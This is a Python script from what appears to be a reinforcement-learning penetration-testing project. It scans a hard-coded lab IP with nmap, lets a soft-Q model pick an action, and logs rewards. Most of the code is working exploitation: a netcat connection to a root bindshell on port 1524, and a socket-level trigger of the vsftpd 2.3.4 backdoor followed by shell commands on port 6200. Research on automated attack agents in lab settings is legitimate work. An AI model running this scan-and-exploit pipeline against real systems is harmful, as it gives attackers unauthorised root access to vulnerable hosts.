import json
import random
import socket
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path

import sys
from pathlib import Path

sys.path.append(str(Path(__file__).resolve().parent.parent))

from rl_agent.predict_softq import predict_action


TARGET_IP = "10.11.202.189"

RAW_DIR = Path("real_logs/raw")
RUN_DIR = Path("real_logs/agent_runs")


def ensure_dirs():
    RAW_DIR.mkdir(parents=True, exist_ok=True)
    RUN_DIR.mkdir(parents=True, exist_ok=True)


def now_str():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H-%M-%SZ")


def state_to_vector(state):
    return [
        float(state.get("num_open_ports", 0)),
        float(state.get("has_ftp", False)),
        float(state.get("has_ssh", False)),
        float(state.get("has_telnet", False)),
        float(state.get("has_http", False)),
        float(state.get("has_mysql", False)),
        float(state.get("has_postgresql", False)),
        float(state.get("has_bindshell_1524", False)),
        float(state.get("has_samba", False)),
        float(state.get("has_tomcat", False)),
        float(state.get("has_vsftpd_234", False)),
    ]


def run_nmap(target):
    print("[*] Running nmap...")
    result = subprocess.run(
        ["nmap", "-sV", "-sC", target],
        capture_output=True,
        text=True,
        timeout=120
    )
    return result.stdout


def parse_open_ports(nmap_output):
    ports = []
    for line in nmap_output.splitlines():
        if "/tcp" in line and " open " in line:
            try:
                ports.append(int(line.split("/")[0]))
            except Exception:
                pass
    return ports


def parse_service_map(nmap_output):
    service_map = {}
    for line in nmap_output.splitlines():
        if "/tcp" in line and " open " in line:
            parts = line.split()
            port = parts[0].split("/")[0]
            service = parts[2]
            version = " ".join(parts[3:]) if len(parts) > 3 else ""
            service_map[port] = {
                "service": service,
                "version": version
            }
    return service_map


def build_state_summary(open_ports, service_map):
    services = {v["service"] for v in service_map.values()}

    return {
        "num_open_ports": len(open_ports),
        "has_ftp": "ftp" in services,
        "has_ssh": "ssh" in services,
        "has_telnet": "telnet" in services,
        "has_http": "http" in services,
        "has_mysql": "mysql" in services,
        "has_postgresql": "postgresql" in services,
        "has_bindshell_1524": 1524 in open_ports,
        "has_samba": any("samba" in v["version"].lower() for v in service_map.values()),
        "has_tomcat": any("tomcat" in v["version"].lower() for v in service_map.values()),
        "has_vsftpd_234": any("vsftpd 2.3.4" in v["version"].lower() for v in service_map.values()),
    }


def save_raw_nmap(output, target, run_id):
    filename = RAW_DIR / "{0}_nmap_{1}_{2}.txt".format(run_id, target, now_str())
    with open(filename, "w", encoding="utf-8") as f:
        f.write(output)
    return str(filename)


def try_bindshell(target):
    print("[*] Trying bindshell...")
    try:
        result = subprocess.run(
            ["nc", target, "1524"],
            input="whoami\nid\nuname -a\nexit\n",
            capture_output=True,
            text=True,
            timeout=8
        )
        stdout = result.stdout
        stderr = result.stderr

        real_success = ("root" in stdout) or ("uid=0" in stdout)
        success = real_success and (random.random() < 0.7)

        return {
            "success": success,
            "stdout": stdout,
            "stderr": stderr,
            "returncode": result.returncode,
            "real_success": real_success,
            "stochastic_success_rate": 0.7
        }

    except Exception as e:
        return {
            "success": False,
            "stdout": "",
            "stderr": str(e),
            "returncode": -1,
            "real_success": False,
            "stochastic_success_rate": 0.7
        }


def try_vsftpd(target):
    print("[*] Trying real vsftpd exploit...")
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((target, 21))
        banner = s.recv(1024).decode(errors="ignore")

        s.send(b"USER test:)\r\n")
        time.sleep(0.2)
        s.send(b"PASS test\r\n")
        time.sleep(0.2)
        s.close()

        time.sleep(2)

        s2 = socket.socket()
        s2.settimeout(5)
        s2.connect((target, 6200))
        s2.send(b"whoami\n")
        time.sleep(0.5)
        output = s2.recv(4096).decode(errors="ignore")
        s2.close()

        real_success = ("root" in output) or ("uid=" in output)
        success = real_success and (random.random() < 0.5)

        return {
            "success": success,
            "stdout": output,
            "stderr": "",
            "returncode": 0,
            "banner": banner,
            "real_success": real_success,
            "stochastic_success_rate": 0.5
        }

    except Exception as e:
        return {
            "success": False,
            "stdout": "",
            "stderr": str(e),
            "returncode": -1,
            "banner": "",
            "real_success": False,
            "stochastic_success_rate": 0.5
        }


def main():
    ensure_dirs()

    run_id = "agent_run_{0}".format(now_str())

    agent_log = {
        "run_id": run_id,
        "target": TARGET_IP,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "steps": []
    }

    nmap_output = run_nmap(TARGET_IP)

    open_ports = parse_open_ports(nmap_output)
    service_map = parse_service_map(nmap_output)
    state_summary = build_state_summary(open_ports, service_map)
    raw_nmap_path = save_raw_nmap(nmap_output, TARGET_IP, run_id)

    agent_log["steps"].append({
        "step": 0,
        "action": "scan_nmap",
        "observation": {
            "target_ip": TARGET_IP
        },
        "result": {
            "open_ports": open_ports,
            "service_map": service_map,
            "state_summary": state_summary,
            "raw_nmap_path": raw_nmap_path
        },
        "reward": 0,
        "done": False
    })

    state_vector = state_to_vector(state_summary)
    predicted_action, q_values = predict_action(state_summary)

    print("[*] Predicted action: {0}".format(predicted_action))
    print("[*] Q values: {0}".format(q_values))

    agent_log["steps"].append({
        "step": 1,
        "action": "softq_predict",
        "observation": {
            "state_summary": state_summary,
            "state_vector": state_vector
        },
        "result": {
            "predicted_action": predicted_action,
            "q_values": q_values
        },
        "reward": 0,
        "done": False
    })

    if predicted_action == "connect_1524_bindshell":
        result = try_bindshell(TARGET_IP)
        reward = 10 if result["success"] else -1

    elif predicted_action == "exploit_vsftpd":
        result = try_vsftpd(TARGET_IP)
        reward = 5 if result["success"] else -1

    else:
        result = {
            "success": True,
            "message": "Agent chose no_exploit"
        }
        reward = 0

    agent_log["steps"].append({
        "step": 2,
        "action": predicted_action,
        "observation": {
            "state_summary": state_summary
        },
        "result": result,
        "reward": reward,
        "done": True
    })

    path = RUN_DIR / "{0}.json".format(run_id)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(agent_log, f, indent=2, ensure_ascii=False)

    print("[✓] Saved to {0}".format(path))


if __name__ == "__main__":
    main()
